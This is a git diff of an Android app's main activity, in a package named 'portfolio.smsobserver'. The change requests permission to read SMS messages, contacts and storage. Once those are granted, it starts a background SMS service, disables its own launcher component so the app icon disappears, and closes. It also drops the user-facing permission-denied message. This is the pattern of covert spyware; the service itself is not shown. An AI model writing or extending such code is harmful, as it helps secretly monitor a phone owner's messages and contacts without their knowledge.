@@ -1,22 +1,16 @@
 package com.android.jerroldelayre.portfolio.smsobserver;
 
 import android.Manifest;
-import android.app.ActivityManager;
 import android.content.ComponentName;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.database.ContentObserver;
-import android.net.Uri;
 import android.os.Build;
-import android.os.Handler;
+import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.android.jerroldelayre.portfolio.R;
 
@@ -26,13 +20,12 @@ public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_CODE_PERMISSION = 1;
 
     private static final String[] PERMISSIONS = { Manifest.permission.READ_SMS,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE };
+            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        //Toast.makeText(this, "haha", Toast.LENGTH_LONG).show();
         requestPermission();
     }
 
@@ -43,18 +36,13 @@ public class MainActivity extends AppCompatActivity {
                 if(!checkAllPermisionsGranted(getApplicationContext(), PERMISSIONS)) {
                     requestPermission();
                 } else {
-                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                        Log.i(TAG, "grantsResult: " + grantResults.length);
-                        Log.i(TAG, "permissions: " + permissions.length);
-                        //startService(new Intent(this, SMSSendService.class));
-                        //finish();
-                        //permission granted
-                        PackageManager packageManager = getPackageManager();
-                        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-                    } else {
-                        //permission denied
-                        Toast.makeText(this, "Permission denied, application is closing.", Toast.LENGTH_LONG).show();
-                    }
+                    Log.i(TAG, "grantsResult: " + grantResults.length);
+                    Log.i(TAG, "permissions: " + permissions.length);
+                    Intent i = new Intent(this, SMSService.class);
+                    this.startService(i);
+                    PackageManager packageManager = getPackageManager();
+                    packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                    finish();
                 }
                 break;
         }
@@ -74,5 +62,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         return true;
+    }
+
+    @Override
+    protected void onDestroy() {
+        Log.i(TAG, "onDestroy called");
+        super.onDestroy();
     }
 }
